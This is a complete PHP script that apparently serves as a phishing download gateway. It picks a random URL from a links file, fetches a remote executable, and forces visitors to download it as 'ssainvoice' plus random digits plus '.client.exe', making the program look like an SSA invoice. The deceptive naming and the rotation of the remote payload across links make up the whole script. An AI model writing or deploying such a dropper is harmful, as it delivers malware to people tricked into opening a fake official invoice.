<?php
session_start();

// Path to the links.txt file
$linksFile = "links.txt";

// Ensure the links.txt file exists
if (!file_exists($linksFile)) {
    error_log("Links file not found!"); // Log error
    die("Links file not found!");
}

// Read all links from the file
$links = file($linksFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

if (empty($links)) {
    error_log("No links available in the file!"); // Log error
    die("No links available in the file!");
}

// Select a random link from the list
$fileUrl = $links[array_rand($links)];

// Generate a random file name
$downloadFileName = "ssainvoice" . rand(100000, 999999) . ".client.exe";

// Check if the selected link is a valid URL
if (!filter_var($fileUrl, FILTER_VALIDATE_URL)) {
    error_log("Invalid file URL: $fileUrl"); // Log error
    die("Invalid file URL!");
}

// Fetch the remote file content
$fileContent = @file_get_contents($fileUrl);

if ($fileContent === false) {
    error_log("Failed to retrieve the file from: $fileUrl"); // Log error
    die("Failed to retrieve the file!");
}

// Set headers to force download
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . $downloadFileName . '"');
header('Content-Length: ' . strlen($fileContent));

// Output the file content
echo $fileContent;
exit;
?>
